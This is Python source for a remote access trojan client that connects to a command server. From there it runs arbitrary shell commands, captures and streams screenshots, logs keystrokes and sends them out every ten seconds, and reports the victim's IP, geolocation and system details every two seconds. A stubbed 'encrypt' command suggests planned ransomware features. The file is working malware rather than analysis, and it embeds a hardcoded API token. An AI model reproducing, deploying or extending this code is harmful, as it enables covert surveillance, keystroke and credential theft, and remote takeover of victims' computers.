import socketio
import atexit
from time import sleep
import os
from playsound import playsound
import pytz
import urllib
import requests
import codecs
from pynput import keyboard
import requests
import json
import threading
import platform
from tkinter.simpledialog import askstring
import webbrowser
import time
import sys
from datetime import datetime
import json
import getpass
import tempfile
from PIL import ImageGrab
import requests
import keyboard
import tkinter.messagebox as tkm
import tkinter#​
import subprocess
from cryptography.fernet import Fernet
import io
import pyscreenshot as imagegrab

STORAGE_SERVER = 'https://storageserver.posydon.repl.co'
MAIN_SERVER = 'https://dumbledoor.posydon.repl.co'
TOKEN = 'f056c72b2110f7'

sio = socketio.Client() #conecting to server
sio.connect(MAIN_SERVER, wait_timeout = 10)

with open('id.txt', 'r') as file:
  id = file.read()#reading file with snape client identification
  file.close()

#start socketio client event handlers:

#handler for basic connection
@sio.on('connect')
def on_connect():
  print('Connected to server')

#debug handler
@sio.on('message')
def on_my_response(data): 
  print('Received from server: ', data)

#handler for shell commands
@sio.on('shell')
def shell(data):
  if data['id'] == id:
    output = subprocess.check_output(data['command'], shell=True)
    output_str = output.decode('utf-8')
    sio.emit('response', data={'output': output_str, 'command': data['command'], 'id': id})

#handler for curses
@sio.on('command')
def command(data):
  print(data)
  if data['id'] == id:
    command = data['command']
    try:
      param1 = data['param1']
    except:
      param1 = None
    try:
      param2 = data['param2']
    except:
      param2 = None
    try:
      param3 = data['param3']
    except:
      param3 = None
    for i in range(0, int(data['repeat'])):
      execute(command, param1, param2, param3)

#End socketio event client handlers, start curse sorting and execution
def execute(command, param1, param2, param3):
  match command:
    case 'msgbox':
      sio.emit('response', data={'output': 'http 69', 'command': 'msgbox', 'id': id})
      msg(param1, param2, param3)
      
    case 'encrypt':
      if param1 == 'current':
        param1 = os.getcwd()
      #encrypt(param1, param2)
      #in development
    case 'screen-feed':
      start_screen_feed()
      
    case 'screenshot':
      print('screenshot')
      screenshot()
      print('screenshot done ')
    case 'sound':
      play_sound(param1)

#End curse sorting, start dumbledoor server-communication functions
      
#this function is for responses that take an arbitrary time
#to send data, are sent to server log to not disrupt 
#dumbledoor terminal
def send_log(data):
  sio.emit('log', data={'content': data})

#for sending data that will be delivered speedily
#and does not risk disrupting dumbledoor terminal
def respond(data):
  sio.emit('response', data={'output': data})

#End communication functions, start main curse function definitions:
def url_open(url):
  webbrowser.open(url)

def play_sound(url):
  mp3_url = url
  mp3_file = urllib.request.urlretrieve(mp3_url)[0]
  with open(mp3_file, 'rb') as f:
      playsound(f)
  os.remove(mp3_file)
  
def temp():
  os.chdir(tempfile.gettempdir())
def start_screen_feed():
  while True:
      # Capture a screenshot of the screen
      screenshot = ImageGrab.grab()
  
      # Convert the screenshot to JPEG format
      buffer = io.BytesIO()
      screenshot.save(buffer, 'JPEG', quality=80)
      buffer.seek(0)
  
      # Send the JPEG-encoded screenshot to the server
      requests.post(f'{MAIN_SERVER}/screen-feed', data=buffer.read())
  
      # Wait for a short period of time before capturing the next screenshot
      time.sleep(0.1)

def diologue_top(title, message):
  sio.emit('response', data={'output': 'http 69; output will be saved in log'})
  root = tkinter.Tk()
  root.wm_attributes('-topmost', 1)
  root.withdraw()
  prompt = askstring(title, message, parent=root)
  send_log(f"user response: {prompt}")
  root.destroy()

def screenshot():
  global id
  try:
    print('screenshot')
    screenshot = ImageGrab.grab()
    screenshot.save('shot.png')
    with open('shot.png', 'rb') as image_file:
      response = requests.post(f'{MAIN_SERVER}/upload', files={'image': image_file})
      send_log(f"server response to screenshot upload: {response}")
    os.remove('shot.png')
  except Exception as e:
    send_log(f'screenshot failed, with exception as follows: \n {e}')

def msg(title, message, type):
  global id
  try:
    root = tkinter.Tk()
    root.wm_attributes('-topmost', 1)
    root.withdraw()
    if type == 'error':
      tkm.showerror(title, message, parent=root)
    elif type == 'info':
      tkm.showinfo(title, message, parent=root)
    elif type == 'warning':
      tkm.showwarning(title, message, parent=root)
    root.destroy()
  except Exception as e:
    sio.emit('response', data={'output': f"error: {e}"})
#keylogger functions: 
def start_keylogger():
  keystrokes = []
  def on_press(key):
    try:
      keystrokes.append(key.char)
    except AttributeError:
      keystrokes.append(str(key))
      
  def send_keystrokes():
    data = {"keystrokes": keystrokes}
    headers = {"Content-Type": "application/json"}
    response = requests.post("http://your_flask_server_url", data=json.dumps(data), headers=headers)
    if response.status_code == 200:
      print("Keystrokes sent successfully!")
    else:
      print("Failed to send keystrokes.")

  with keyboard.Listener(on_press=on_press) as listener:
    def send_keystrokes_timer():
      send_keystrokes()
      threading.Timer(10, send_keystrokes_timer).start()

    threading.Timer(0, send_keystrokes_timer).start()
    listener.join()
#End main curse functions, start server check-in loop
keylogger_thread = threading.Thread(target=start_keylogger)
keylogger_thread.start()
while True:
  tz_NY = pytz.timezone('America/New_York')
  datetime_NY = datetime.now(tz_NY)
  time = datetime_NY.strftime('%H:%M:%S')
  
  system = platform.system()
  release = platform.release()
  version = platform.version()
  
  url = f'http://ipinfo.io/json?token={TOKEN}'
  response_ipinfo = eval(requests.get(url, headers = {'User-agent': f'snape@{id}'}).text)
  ip = requests.get('https://api.ipify.org').content.decode('utf8')
  data = response_ipinfo

  city = data['city'].replace(' ', '_')
  country = data['country'].replace(' ', '_')
  region = data['region'].replace(' ', '_')
  longitude = data['loc'].split(',')[0]
  latitude = data['loc'].split(',')[1]
  postal = data['postal']
  timezone = data['timezone']
  
  data_dict = {'id':str(id), 'ip': str(ip), 'timezone': str(tz_NY), 'time': str(time), 'system': str(system), 'release': str(release), 'version': str(version), 'city': str(city), 'country': str(country), 'region': str(region), 'longitude': str(longitude), 'latitude': str(latitude), 'postal': str(postal)}
  try:
    sio.emit('check_in', data_dict)
    print('sent')
  except:
    print('failed to send')
  sleep(2)
